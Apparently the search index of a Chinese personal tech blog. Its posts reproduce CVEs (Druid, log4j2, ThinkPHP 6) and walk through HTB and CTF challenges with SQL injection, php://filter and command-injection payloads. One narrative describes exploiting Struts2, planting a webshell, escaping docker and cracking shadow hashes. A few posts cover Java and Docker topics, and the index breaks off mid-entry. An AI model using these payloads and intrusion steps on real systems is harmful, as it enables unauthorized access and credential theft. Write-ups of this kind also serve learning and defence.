<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Apache Druid任意文件读取漏洞（CVE-2021-36749）</title>
    <link href="/2022/01/03/apache-druid%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88cve-2021-36749%EF%BC%89/index/"/>
    <url>/2022/01/03/apache-druid%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88cve-2021-36749%EF%BC%89/index/</url>
    
    <content type="html"><![CDATA[<h4 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h4><p>Apache Druid是针对时间序列数据提供的低延时数据写入以及快速交互式查询的分布式OLAP数据库。 在Apache Druid中，InputSource是用于读取来自某个数据源的数据，但因对用户可控的HTTP InputSource限制不足，Apache Druid允许经过身份验证的用户以 Druid 服务器进程的权限从指定数据源读取数据，包括本地文件系统。又因Apache Druid 默认情况下缺乏授权认证，攻击者可通过构造恶意请求实现在未授权的情况下读取目标系统任意文件，可导致系统敏感信息泄漏。</p><h4 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h4><p>Apache Druid &lt;= 0.21.1</p><h4 id="fofa语法"><a href="#fofa语法" class="headerlink" title="fofa语法"></a>fofa语法</h4><pre><code class="hljs ini"><span class="hljs-attr">title</span>=<span class="hljs-string">&quot;Apache Druid&quot;</span></code></pre><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p><img src="images/01.png"></p><p><img src="images/02.png"></p><p><img src="images/03.png"></p><h4 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h4><ol><li>及时升级Apache Druid至最新安全版本：Apache Druid 0.22.0。下载地址：<a href="https://druid.apache.org/downloads.html">https://druid.apache.org/downloads.html</a></li><li>上安全设备，例如waf、IPS等</li></ol>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>log4j2漏洞复现</title>
    <link href="/2022/01/03/log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index/"/>
    <url>/2022/01/03/log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index/</url>
    
    <content type="html"><![CDATA[<h4 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h4><p>Apache Log4j是一个基于Java的日志记录组件，Apache Log4j2是Log4j的升级版本，通过重写Log4j引入了丰富的功能特性。该日志组件被广泛应用于业务系统开发，用以记录程序输入输出日志信息。2021年11月24日，阿里云安全团队向Apache官方报告了Apache Log4j2远程代码执行漏洞。由于Log4j2组件在处理程序日志记录时存在JNDI注入缺陷，未经授权的攻击者利用该漏洞，可向目标服务器发送精心构造的恶意数据，触发Log4j2组件解析缺陷，实现目标服务器的任意代码执行，获得目标服务器权限。</p><h4 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h4><p>2.x &lt;=Log4j2&lt;= 2.17</p><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>首先在服务器上启动jndi服务用以加载恶意代码 <img src="images/04.png"> bp抓包后重放，并将jdni请求的地址换为上图的箭头所指 <img src="images/02-1.png"> 服务器nc监听反弹shell的端口然后点击bp的发送即可接收到shell，flag在/tmp目录下 <img src="images/03-1.png"></p><h4 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h4><p>目前，Apache官方已发布新版本完成漏洞修复，建议及时升级至最新版本： <a href="https://github.com/apache/logging-log4j2/archive/refs/tags/rel/2.17.1.zip">https://github.com/apache/logging-log4j2/archive/refs/tags/rel/2.17.1.zip</a> 建议同时采用如下临时措施进行漏洞防范： 1.添加jvm启动参数-Dlog4j2.formatMsgNoLookups=true 2.在应用classpath下添加log4j2.component.properties配置文件，文件内容为log4j2.formatMsgNoLookups=true； 3.JDK使用11.0.1、8u191、7u201、6u211及以上的高版本； 4.部署使用第三方防火墙产品例如waf、IPS等进行安全防护。</p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>HTB Can you encrypt fast enough?</title>
    <link href="/2021/11/12/htb-can-you-encrypt-fast-enough/index/"/>
    <url>/2021/11/12/htb-can-you-encrypt-fast-enough/index/</url>
    
    <content type="html"><![CDATA[<p>打开界面后如下图： <a href="https://jwqta.github.io/2021/03/05/HTB-Can-you-encrypt-fast-enough/01.png"><img src="images/01.png" alt="img"></a> 尝试MD5加密后填进输入框后提示 “Too slow!” <a href="https://jwqta.github.io/2021/03/05/HTB-Can-you-encrypt-fast-enough/02.png"><img src="images/02.png" alt="img"></a> 查看源码后推测，应该是用程序发包，构造如下Python代码：</p><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> hashlib<span class="hljs-keyword">import</span> reurl=&quot;http://你的地址&quot;r=requests.<span class="hljs-keyword">session</span>()<span class="hljs-keyword">out</span>=r.<span class="hljs-keyword">get</span>(url)rr = re.compile(r&quot;&lt;h3 align=&#x27;center&#x27;&gt;(\S+)&lt;/h3&gt;&quot;, re.I)str1 = rr.findall(<span class="hljs-keyword">out</span>.text)str2=hashlib.md5(str1[<span class="hljs-number">0</span>].encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).hexdigest()data=&#123;<span class="hljs-string">&#x27;hash&#x27;</span>: str2&#125;<span class="hljs-keyword">out</span> = r.post(url = url, data = data)print(<span class="hljs-keyword">out</span>.text)<span class="hljs-keyword">Copy</span></code></pre><p>成功回复flag <a href="https://rabb1tq.github.io/2021/03/05/HTB-Can-you-encrypt-fast-enough/03.png"><img src="images/03.png" alt="img"></a></p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>HTB Passage教程</title>
    <link href="/2021/11/12/htb-passage%E6%95%99%E7%A8%8B/index/"/>
    <url>/2021/11/12/htb-passage%E6%95%99%E7%A8%8B/index/</url>
    
    <content type="html"><![CDATA[<p>打开界面如图： <a href="https://rabb1tq.github.io/2021/03/05/HTB-Passage%E6%95%99%E7%A8%8B/01.png"><img src="images/01.png" alt="img"></a></p><p>看了下最底部有CMS ：CuteNews 注册个用户： <a href="https://rabb1tq.github.io/2021/03/05/HTB-Passage%E6%95%99%E7%A8%8B/02.png"><img src="images/02.png" alt="img"></a></p><p>最下方有版本号：2.1.2,直接百度CuteNews 2.1.2复现，查到有相关漏洞，直接下载poc（poc在最下方），放到MSF中，MSF加载脚本（不会的自己百度）： <a href="https://rabb1tq.github.io/2021/03/05/HTB-Passage%E6%95%99%E7%A8%8B/03.png"><img src="images/03.png" alt="img"></a></p><p>设置相应参数，成功得到meterpreter会话： <a href="https://rabb1tq.github.io/2021/03/05/HTB-Passage%E6%95%99%E7%A8%8B/04.png"><img src="images/04.png" alt="img"></a></p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>thinkphp6.x任意文件写入漏洞</title>
    <link href="/2021/11/12/thinkphp6-x%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/index/"/>
    <url>/2021/11/12/thinkphp6-x%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/index/</url>
    
    <content type="html"><![CDATA[<ol><li>在cookies中构造长度为32位的PHPSESSID:如/../../../public/0000000000x.php <img src="images/1605886532449.png" alt="img"></li><li>访问index/vuln?param= param后的参数即为你要输入的payload</li><li>访问后会在 web 根目录生成 0000000000x.php （如果有写入权限的话）</li><li>写入一句话：将param后的参数替换为一句话</li><li>蚁剑连接： <img src="images/1605886884765.png" alt="img"></li><li>成功getshell： <img src="images/1605887022637.png" alt="img"></li></ol>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>实战web打点到内网漫游</title>
    <link href="/2021/11/12/%E5%AE%9E%E6%88%98web%E6%89%93%E7%82%B9%E5%88%B0%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8/index/"/>
    <url>/2021/11/12/%E5%AE%9E%E6%88%98web%E6%89%93%E7%82%B9%E5%88%B0%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8/index/</url>
    
    <content type="html"><![CDATA[<p>首先扫描主机： <a href="https://rabb1tq.github.io/2021/03/20/%E5%AE%9E%E6%88%98web%E6%89%93%E7%82%B9%E5%88%B0%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8/01.png"><img src="images/01.png" alt="img"></a></p><p>开启的端口有2001和22，22先扔那，没有办法再日他，访问2001地址，是一个web： <a href="https://rabb1tq.github.io/2021/03/20/%E5%AE%9E%E6%88%98web%E6%89%93%E7%82%B9%E5%88%B0%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8/02.png"><img src="images/02.png" alt="img"></a></p><p>发现.acition后缀，第一反应struct2，掏出我的小学生工具： <a href="https://rabb1tq.github.io/2021/03/20/%E5%AE%9E%E6%88%98web%E6%89%93%E7%82%B9%E5%88%B0%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8/03.png"><img src="images/03.png" alt="img"></a></p><p>嗯。。。有洞，上传我的冰蝎马： <a href="https://rabb1tq.github.io/2021/03/20/%E5%AE%9E%E6%88%98web%E6%89%93%E7%82%B9%E5%88%B0%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8/04.png"><img src="images/04.png" alt="img"></a></p><p>连接后发现根目录下的.dockerenv文件 <a href="https://rabb1tq.github.io/2021/03/20/%E5%AE%9E%E6%88%98web%E6%89%93%E7%82%B9%E5%88%B0%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8/05.png"><img src="images/05.png" alt="img"></a></p><p>哎嘿，小老弟，在docker里面，常规的docker逃逸我就知道那几个，脏牛，cve-2019-5736，磁盘挂载，那个cve-2019-5736动静有点大而且要求比较多，还是掏出我得小学生工具cdk，尝试磁盘挂载，执行命令：./cdk run mount-disk，成功 <a href="https://rabb1tq.github.io/2021/03/20/%E5%AE%9E%E6%88%98web%E6%89%93%E7%82%B9%E5%88%B0%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8/06.png"><img src="images/06.png" alt="img"></a></p><p>进入temp目录找到挂载的磁盘： <a href="https://rabb1tq.github.io/2021/03/20/%E5%AE%9E%E6%88%98web%E6%89%93%E7%82%B9%E5%88%B0%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8/07.png"><img src="images/07.png" alt="img"></a></p><p>下载shadow以及passwd到本地，执行：unshadow passwd shadow &gt; test_passwd，合并为一个文件： <a href="https://rabb1tq.github.io/2021/03/20/%E5%AE%9E%E6%88%98web%E6%89%93%E7%82%B9%E5%88%B0%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8/08.png"><img src="images/08.png" alt="img"></a></p><p>掏出我的小学生工具，john日他（不日我的新电脑岂不是白买了） <a href="https://rabb1tq.github.io/2021/03/20/%E5%AE%9E%E6%88%98web%E6%89%93%E7%82%B9%E5%88%B0%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8/09.png"><img src="images/09.png" alt="img"></a></p><p>日出来，用户名：ubuntu 密码：ubuntu，掏出我的putty连他 <a href="https://rabb1tq.github.io/2021/03/20/%E5%AE%9E%E6%88%98web%E6%89%93%E7%82%B9%E5%88%B0%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8/10.png"><img src="images/10.png" alt="img"></a> 嗯。。。今天有点晚，就先搞到这吧，下一篇文章继续</p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>连接多层内网redis</title>
    <link href="/2021/11/12/%E8%BF%9E%E6%8E%A5%E5%A4%9A%E5%B1%82%E5%86%85%E7%BD%91redis/index/"/>
    <url>/2021/11/12/%E8%BF%9E%E6%8E%A5%E5%A4%9A%E5%B1%82%E5%86%85%E7%BD%91redis/index/</url>
    
    <content type="html"><![CDATA[<p>今天我的团队的hxd在打多层内网（有授权），有内网的redis密码，但是层数太多，所以探讨怎么连接过去，作为优秀的社会主义新青年，我立马给了俩方案：</p><ol><li>socks代理过去连接</li><li>端口转发，直接连接外网ip</li></ol><p>分析思路如下：</p><p>首先我们要知道Redis底层网络通信协议其实是通过TCP来完成的，下面是一堆废话，可看可不看</p><ul><li>状态回复（status reply）的第一个字节是 <code>&quot;+&quot;</code></li><li>错误回复（error reply）的第一个字节是 <code>&quot;-&quot;</code></li><li>整数回复（integer reply）的第一个字节是 <code>&quot;:&quot;</code></li><li>批量回复（bulk reply）的第一个字节是 <code>&quot;$&quot;</code></li><li>多条批量回复（multi bulk reply）的第一个字节是 <code>&quot;*&quot;</code></li></ul><p>继续，既然是基于TCP协议，那就两个思路，一个是socks直接代理进去，另一个是端口转发，windows自带了个netsh，这玩意做端口转发还是挺香的,下面依旧是废话，可看可不看</p><p>添加一条转发：</p><pre><code class="hljs routeros">netsh<span class="hljs-built_in"> interface </span>portproxyadd v4tov4 <span class="hljs-attribute">listenport</span>=监听端口 <span class="hljs-attribute">listenaddress</span>=监听地址 <span class="hljs-attribute">connectport</span>=目标端口 <span class="hljs-attribute">connectaddress</span>=目标地址</code></pre><p>查看转发：</p><p><code>`netsh interface portproxyshow all`</code></p><p>删除转发:</p><p><code>`netsh interface portproxy delete v4tov4 listenport=3340 listenaddress=192.168.204.150`</code></p><p>继续，模拟的测试环境拓扑大概是这样的（别问我为啥没画专业的拓扑图，麻烦）：</p><p><img src="images/tuopu.png" alt="img"></p><p>我的主机可以直连192.168.169.239，通过这个主机做netsh端口转发:</p><p><code>`netsh interface portproxyadd v4tov4 listenport=3340 listenaddress=0.0.0.0 connectport=6379 connectaddress=169.2 54.43.139`</code></p><p>redis服务器起个redis服务：</p><pre><code class="hljs vim">redis-server.<span class="hljs-keyword">exe</span> --protected-<span class="hljs-keyword">mode</span> <span class="hljs-keyword">no</span>  //--protected-<span class="hljs-keyword">mode</span> <span class="hljs-keyword">no</span> 这个是用来禁用受保护模式，省的以后被人入侵，所以用这个只是关闭一次</code></pre><p>本地连接192.169.169.239的监听端口：</p><pre><code class="hljs apache"><span class="hljs-attribute">redis</span>-cli.exe -h <span class="hljs-number">192.168.169.239</span> -p <span class="hljs-number">3340</span></code></pre><p>结果：</p><p><img src="images/result.png" alt="img"></p><p>这个都好使了，那个应该也是好使的，我就不测试了，请原谅我是一个懒比，不原谅也无所谓，我不在乎</p><p><img src="images/biaoqing.png" alt="img"></p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CTF靶场记录</title>
    <link href="/2021/11/12/ctf%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/index/"/>
    <url>/2021/11/12/ctf%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/index/</url>
    
    <content type="html"><![CDATA[<ol><li>EasySQL,第一反应就是sql注入，别问为啥，问就是因为我流批直接后面丢sql注释就完了 <img src="images/01.png" alt="img"></li><li>随便注，第一反应还是sql注入，直接丢个 <code>1;show databases</code> <img src="images/02.png" alt="img"> emmm好使了，那就接着读表吧 <img src="images/03.png" alt="img"> 表出来就直接读字段就完了 <code>1-1&#39;;show columns from 1919810931114514#</code> <img src="images/04.png" alt="img"> 后台有正则验证，直接大小写加拼接绕过即可 <code>-1&#39;;Set @sql = CONCAT(&#39;se&#39;,&#39;lect * from 1919810931114514;&#39;);Prepare stmt from @sql;EXECUTE stmt;#</code> <img src="images/05.png" alt="img"></li><li>Havefun进来就看着个这玩意 <img src="images/06.png" alt="img"> 这时候必备的前端技能来了，直接右键检查，看到flag字段没 <img src="images/07.png" alt="img"> 直接构造payload： <code>/?cat=dog</code> flag就出来了，简简单单 <img src="images/08.gif" alt="img"></li><li>EasySQL不多墨迹，调整mysql 的sql_mode，payload： <code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code> <img src="images/09.png" alt="img"></li><li>Include,直接点tips，看到url这不就是文件包含，flag.php，那就想办法把源码读出来就完了呗 <img src="images/10.png" alt="img"> payload: <code>?file=php://filter/read=convert.base64-encode/resource=flag.php</code> 读出来的东西直接base64解码就完了</li><li>Secret File,一进来，卧槽，这什么玩意？？？ <img src="images/11.png" alt="img"> 想了想，继续我的f12大法，嗯哼，发现了一个文件，小老弟，我可是做过前端开发的 <a href="https://rabb1tq.github.io/2021/05/05/CTF%E7%AC%94%E8%AE%B0/12.png"><img src="images/12.png" alt="img"></a><a href="https://rabb1tq.github.io/2021/05/05/CTF%E7%AC%94%E8%AE%B0/13.png"><img src="images/13.png" alt="img"></a> 点一下，一闪而过，嘿，你还没头了，burp直接抓包，一点不带惯着的 <img src="images/14.png" alt="img"> 又让我逮到了吧，访问他就完了呗，结果又给我整出来代码了，真想抽出我四十米的大砍刀，算了，出题的表哥我应该打不过 <img src="images/15.png" alt="img"> 直接访问flag.php <img src="images/16.png" alt="img"> 。。。。。。。。。。。。。。。。。。。。。你到底要干啥 继续我的文件包含大业吧，构造payload： <code>?file=php://filter/read=convert.base64-encode/resource=./flag.php</code> <img src="images/17.png" alt="img"> 。。。。竟然还需要加解密，那就解他就完了呗，一看就是base64，解出来就是这样的： <pre><code class="hljs markdown"><span class="hljs-code">    </span><span class="hljs-code">    FLAG</span><span class="hljs-code"></span><span class="hljs-code"></span><span class="hljs-code"></span><span class="hljs-code"></span><span class="hljs-code">    啊哈！你找到我了！可是你看不到我QAQ~~~</span><span class="hljs-code"></span><span class="hljs-code">    </span><span class="hljs-code">        </span><span class="hljs-code">    </span><span class="hljs-code"></span><span class="hljs-code">Copy</span></code></pre> flag清清楚楚的就摆在那，搞定</li><li>一打开就是下面这个样子，这个我不是做过吗，这么简单 <img src="images/18.png" alt="img"> Login Success! ？？？？不是成功了嘛。。。。 <img src="images/19.png" alt="img"> 那就想办法爆库爆表爆字段吧： <pre><code class="hljs gauss"><span class="hljs-meta">#查列数</span>admin&#x27; order by <span class="hljs-number">1</span><span class="hljs-meta">#</span><span class="hljs-meta">#查回显位</span><span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><span class="hljs-meta">#</span><span class="hljs-meta">#查库</span><span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-built_in">database</span>()<span class="hljs-meta">#</span><span class="hljs-meta">#查表</span><span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-built_in">group_concat</span>(table_name) from information_schema.tables <span class="hljs-built_in">where</span> table_schema = &#x27;geek&#x27;<span class="hljs-meta">#</span><span class="hljs-meta">#查字段</span><span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-built_in">group_concat</span>(column_name) from information_schema.columns <span class="hljs-built_in">where</span> table_name = &#x27;l0ve1ysq1&#x27;<span class="hljs-meta">#</span><span class="hljs-meta">#查flag</span><span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-built_in">group_concat</span>(password) from  l0ve1ysq1<span class="hljs-meta">#</span>Copy</code></pre></li><li>EXEC,明显的命令执行，带个ls试试： <img src="images/20.png" alt="img"> 接下来就翻就完了 <code>127.0.0.1;cat ../../../flag</code></li></ol><p>就先写这些吧，一点难度都没有，莫得意思（开玩笑的，别打我）</p><p><a href="https://rabb1tq.github.io/2021/05/05/CTF%E7%AC%94%E8%AE%B0/21.png"><img src="images/21.png" alt="img"></a></p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>未来一段时间的计划</title>
    <link href="/2021/06/19/%E6%9C%AA%E6%9D%A5%E4%B8%80%E6%AE%B5%E6%97%B6%E9%97%B4%E7%9A%84%E8%AE%A1%E5%88%92/index/"/>
    <url>/2021/06/19/%E6%9C%AA%E6%9D%A5%E4%B8%80%E6%AE%B5%E6%97%B6%E9%97%B4%E7%9A%84%E8%AE%A1%E5%88%92/index/</url>
    
    <content type="html"><![CDATA[<h4 id="由于所处行业问题，这个博客真的很久没有进行更新了，最近有在和一些业内的大佬们进行请教及切磋交流，也该对自己做一个短期内的规划了，如下："><a href="#由于所处行业问题，这个博客真的很久没有进行更新了，最近有在和一些业内的大佬们进行请教及切磋交流，也该对自己做一个短期内的规划了，如下：" class="headerlink" title="由于所处行业问题，这个博客真的很久没有进行更新了，最近有在和一些业内的大佬们进行请教及切磋交流，也该对自己做一个短期内的规划了，如下："></a>由于所处行业问题，这个博客真的很久没有进行更新了，最近有在和一些业内的大佬们进行请教及切磋交流，也该对自己做一个短期内的规划了，如下：</h4><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 三周内搞定小迪师傅最新的教程（由于已经有经验，并且前几个版本已经看过，所以三周时间倍速播放应该是足够了。）并对学习的未知或已知但不熟悉的内容记下相应笔记<span class="hljs-bullet">2.</span> 三个月搞定之前的在线教育项目，对java企业级开发所用技术进行一次完整的经历，对于不熟地方必须搞懂并记下笔记，并推出v1.0可用版本<span class="hljs-bullet">3.</span> 对vulhub靶场的所有环境进行复现并写下相应复现笔记，对于可重用的工具进行整理，对于自己开发的工具进行记录，在后期统一开发（此处大概需要两个月左右）<span class="hljs-bullet">4.</span> 进行代码审计学习，对GitHub项目进行不依赖工具手动代码审计并挖出0day<span class="hljs-bullet">5.</span> 学习c++及汇编对操作系统底层进行深入了解（这个最起码需要一年多的时间），学习过后进行高质量的漏洞挖掘</code></pre><p>以上就是未来一段时间的规划，我记得7kb表哥和我说的，我应该给自己立一个目标，而不是特别盲目的到处学习，可以以身边的人为目标，一年后我就要超过他，仔细想了想，我的目标只有一个，干掉自己的惰性，自己才是最大的敌人。</p><p>记得我刚入行那会也是自学，从头到尾没有任何人教。还记得当时学的第一件事就是黑客守则，当然，我也没有完全遵守，但是我有我的职业操守，不应该干的事，违反道德的事，违反法律的事我一概不做。可能有些人觉得我这样是有病，但是我觉得能力越大责任越大，人应该学会约束自己，尤其是安全，一不注意可能就会追悔莫及。最近也有很多小兄弟们在问我应该怎么学习下面写出我个人的想法吧：</p><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 熟读网络安全法，有好多表哥们因为没注意到所以进去了<span class="hljs-bullet">2.</span> 重视基础，要想盖高楼那就先要打地基，安全不是一蹴而就也不是说你能给谁挂个黑页你就是学会网络安全了<span class="hljs-bullet">3.</span> 学习规划很重要，磨刀不误砍柴工，网上有很多发展路线的思维导图，可以从中选出一个适合自己的重要的事情说三遍: <span class="hljs-strong">**熟读网络安全法!熟读网络安全法!熟读网络安全法!**</span></code></pre><p>最后，不要叫我大佬了，我不配，顶多算是个中佬 <a href="http://qtbk.xyz/wp-content/uploads/2021/06/a.jpg"><img src="images/a.jpg"></a></p>]]></content>
    
    
    <categories>
      
      <category>杂七杂八区</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>singleton单例</title>
    <link href="/2021/03/06/singleton%E5%8D%95%E4%BE%8B/index/"/>
    <url>/2021/03/06/singleton%E5%8D%95%E4%BE%8B/index/</url>
    
    <content type="html"><![CDATA[<h2 id="1-饿汉式"><a href="#1-饿汉式" class="headerlink" title="1.饿汉式"></a>1.饿汉式</h2><ul><li>类加载到内存后，就实例化一个单例，JVM保证线程安全</li><li>简单实用，推荐使用！</li><li>唯一缺点：不管用到与否，类装载时就完成实例化</li></ul><h2 id="2-懒汉式"><a href="#2-懒汉式" class="headerlink" title="2.懒汉式"></a>2.懒汉式</h2><ul><li>虽然达到了按需初始化的目的，但却带来线程不安全的问题</li><li>可以通过synchronized解决，但也带来效率下降</li><li>需双重判断，是最常用的单例</li></ul><p>小tips:</p><pre><code class="hljs arduino"><span class="hljs-comment">//禁止指令重排序,当一个线程修改了这个变量的值，volatile 保证了新值能立即同步到主内存，以及每次使用前立即从主内存刷新</span><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">volatile</span> Mgr06 INSTANCE;</code></pre><p>volatile关键字参考链接:<a href="https://qtbk.xyz/?p=844">https://qtbk.xyz/?p=844</a></p><h2 id="3-静态内部类方式"><a href="#3-静态内部类方式" class="headerlink" title="3.静态内部类方式"></a>3.静态内部类方式</h2><ul><li>内部类在类加载的时候不会被实例化，实现懒加载的方式，同时类加载的时候是线程安全的，类的静态属性只会在第一次加载时初始化，JVM在帮助我们保证了线程的安全性，推荐使用。</li></ul><h2 id="4-枚举单例"><a href="#4-枚举单例" class="headerlink" title="4.枚举单例"></a>4.枚举单例</h2><ul><li>不仅可以解决线程同步，还可以防止反序列化，fastjson就采用的这种方式</li><li>我所知最完美的单例</li><li>其他例子在不考虑反射的情况下可用，但是如果说使用反射可以创建出新的实例，而枚举单例能避免这种情况。</li><li>在使用反射时枚举单例会报Exception in thread “main” java.lang.NoSuchMethodException。出现这个异常的原因是因为EnumSingleton.class.getDeclaredConstructors()获取所有构造器，会发现并没有我们所设置的无参构造器，只有一个参数为（String.class,int.class）构造器，而且在反射在通过newInstance创建对象时，会检查该类是否ENUM修饰，如果是则抛出异常，反射失败。所以枚举是不怕反射``攻击的</li></ul>]]></content>
    
    
    <categories>
      
      <category>设计模式</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>volatile</title>
    <link href="/2021/03/06/volatile/index/"/>
    <url>/2021/03/06/volatile/index/</url>
    
    <content type="html"><![CDATA[<h3 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h3><p>这是Java的一个可以和synchronized各领风骚的关键字，在并发编程时好多程序员遇到线程安全的问题直接使用synchronized，但是这样有问题：synchronized是阻塞式同步，在线程竞争激烈的情况下会升级为重量级锁。而针对volatile修饰的变量给java虚拟机特殊的约定，线程对volatile变量的修改会立刻被其他线程所感知，即不会出现数据脏读的现象，从而保证数据的“可见性”。</p><h3 id="2-原理"><a href="#2-原理" class="headerlink" title="2.原理"></a>2.原理</h3><p>在生成汇编代码时，volatile修饰的变量在写操作时会多出一个lock前缀的命令，lock指令的作用：</p><ul><li>将当前缓存行的数据写回到系统内存并使得其他cpu缓存了该地址的指令无效</li><li>当cpu发现本地缓存失效后将会重新从内存中读取该变量数据获取最新值</li></ul><h3 id="3-总结："><a href="#3-总结：" class="headerlink" title="3.总结："></a>3.总结：</h3><p>volatile变量可以通过“缓存一致性”协议保证每个线程都能获取到最新值，即满足数据的可见性。</p>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>docker源</title>
    <link href="/2020/12/08/docker%E6%BA%90/index/"/>
    <url>/2020/12/08/docker%E6%BA%90/index/</url>
    
    <content type="html"><![CDATA[<p>docker的国内源基本上都不行，经过测试，亚马逊的中国源ok</p><p>首先打开：</p><pre><code class="hljs awk"><span class="hljs-regexp">/etc/</span>docker/daemon.json</code></pre><p>然后把下面的代码放进去，记得看一眼中英文</p><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;registry-mirrors&quot;</span>:[<span class="hljs-string">&quot;https://dockerhub.azk8s.cn/&quot;</span>]&#125;</code></pre><p>接着重启docker</p><p>service docker restart</p><p>测试：</p><p><code>docker run hello-world</code></p><p>搞定，完美！</p>]]></content>
    
    
    <categories>
      
      <category>杂七杂八区</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>DOCKER启动失败Job for docker.service failed because the control process exited with error code. See &quot;syste mctl status docker.service&quot; and &quot;journalctl -xe&quot; for details.</title>
    <link href="/2020/12/08/docker%E5%90%AF%E5%8A%A8%E5%A4%B1%E8%B4%A5job-for-docker-service-failed-because-the-control-process-exited-with-error-code-see-syste-mctl-status-docker-service-and-journalctl-xe-for-details/index/"/>
    <url>/2020/12/08/docker%E5%90%AF%E5%8A%A8%E5%A4%B1%E8%B4%A5job-for-docker-service-failed-because-the-control-process-exited-with-error-code-see-syste-mctl-status-docker-service-and-journalctl-xe-for-details/index/</url>
    
    <content type="html"><![CDATA[<p>更换源以后出现这个问题：</p><p><code>Job for docker.service failed because the control process exited with error code.   See &quot;systemctl status docker.service&quot; and &quot;journalctl -xe&quot; for details</code></p><p>解决方案：</p><p>更改/etc/docker/daemon.json，里面可能是中英文之类的错误</p>]]></content>
    
    
    <categories>
      
      <category>杂七杂八区</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>hexo引用本地图片无法显示</title>
    <link href="/2020/11/21/hexo%E5%BC%95%E7%94%A8%E6%9C%AC%E5%9C%B0%E5%9B%BE%E7%89%87%E6%97%A0%E6%B3%95%E6%98%BE%E7%A4%BA/index/"/>
    <url>/2020/11/21/hexo%E5%BC%95%E7%94%A8%E6%9C%AC%E5%9C%B0%E5%9B%BE%E7%89%87%E6%97%A0%E6%B3%95%E6%98%BE%E7%A4%BA/index/</url>
    
